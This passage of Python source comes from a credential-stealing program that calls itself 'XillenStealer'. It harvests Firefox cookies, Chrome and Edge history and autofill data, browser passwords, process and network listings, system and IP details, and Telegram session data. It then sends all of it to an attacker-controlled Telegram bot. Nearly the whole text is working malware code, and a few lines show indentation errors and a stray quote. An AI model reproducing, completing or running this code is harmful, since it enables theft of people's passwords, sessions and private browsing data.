                    cookies_path = os.path.join(firefox_path, profile, "cookies.sqlite")
                    if os.path.exists(cookies_path):
                        try:
                            conn = sqlite3.connect(cookies_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT name, value, host, path FROM moz_cookies")
                            for row in cursor.fetchall():
                                cookies.append({
                                    'name': row[0],
                                    'value': row[1],
                                    'domain': row[2],
                                    'path': row[3],
                                    'browser': 'Firefox'
                                })
                            conn.close()
                        except:
                            pass
    except Exception as e:
        print(f"Error collecting cookies: {e}")
    return cookies

def _collect_processes():
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username'],
                    'cpu_percent': proc.info['cpu_percent'],
                    'memory_percent': proc.info['memory_percent']
                })
            except:
                continue
    except Exception as e:
        print(f"Error collecting processes: {e}")
    return processes

def _collect_connections():
    connections = []
    try:
        for conn in psutil.net_connections():
            connections.append({
                'local_address': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A",
                'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                'status': conn.status,
                'pid': conn.pid
            })
    except Exception as e:
        print(f"Error collecting connections: {e}")
    return connections

def _collect_browser_history():
    history = []
    try:
        # Chrome history
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'last_visit': row[3],
                    'browser': 'Chrome'
                })
            conn.close()
        
        # Edge history
        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
        if os.path.exists(edge_path):
            conn = sqlite3.connect(edge_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'last_visit': row[3],
                    'browser': 'Edge'
                })
            conn.close()
    except Exception as e:
        print(f"Error collecting history: {e}")
    return history

def _collect_autofill_data():
    autofill = []
    try:
        # Chrome autofill
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 50")
            for row in cursor.fetchall():
                autofill.append({
                    'name': row[0],
                    'value': row[1],
                    'date_created': row[2],
                    'browser': 'Chrome'
                })
            conn.close()
        
        # Edge autofill
        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data")
        if os.path.exists(edge_path):
            conn = sqlite3.connect(edge_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value, date_created FROM autofill ORDER BY date_created DESC LIMIT 50")
            for row in cursor.fetchall():
                autofill.append({
                    'name': row[0],
                    'value': row[1],
                    'date_created': row[2],
                    'browser': 'Edge'
                })
            conn.close()
    except Exception as e:
        print(f"Error collecting autofill: {e}")
    return autofill

def main():
    print("[DEBUG] Starting XillenStealer...")
    print(f"[DEBUG] Bot token: {config.TG_BOT_TOKEN[:10]}...")
    print(f"[DEBUG] Chat ID: {config.TG_CHAT_ID}")
	
	
	log("Collecting system information...")
    system_info = {
        'hostname': socket.gethostname(),
        'os': f"{platform.system()} {platform.release()}",
        'architecture': platform.architecture()[0],
        'processor': platform.processor(),
        'user': getpass.getuser(),
        'cpu_count': psutil.cpu_count(),
        'memory_gb': round(psutil.virtual_memory().total / (1024**3), 2),
        'ip_address': _get_ip_address(),
        'mac_address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    }
    
    log("Collecting browser passwords...")
    passwords = _collect_browser_passwords()
    
    log("Collecting browser cookies...")
    cookies = _collect_browser_cookies()
    
    log("Collecting processes...")
    processes = _collect_processes()
    
    log("Collecting network connections...")
    connections = _collect_connections()
    
    log("Collecting browser history...")
    history = _collect_browser_history()
    
    log("Collecting autofill data...")
    autofill = _collect_autofill_data()
    
    log("Collecting Telegram tdata...")
    data_collector = ExtendedDataCollector()
    telegram_tdata = data_collector.collect_telegram_tdata()
    
    collected_data = {
        'system_info': system_info,
        'passwords': passwords,
        'cookies': cookies,
        'processes': processes,
        'network_connections': connections,
        'history': history,
        'autofill': autofill,
        'telegram_tdata': telegram_tdata
    }
    
    log("Data collection completed! Preparing to send to Telegram...")
    telegram_language = getattr(config, 'TELEGRAM_LANGUAGE', 'ru')
    log(f"Sending report to Telegram in {telegram_language} language...")
    send_telegram_report(collected_data, telegram_language)
    log("Advanced data collection completed")
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        with open("xillen_crash.log", "w") as f:
            f.write(f"Critical error: {str(e)}\n{traceback.format_exc()}")"
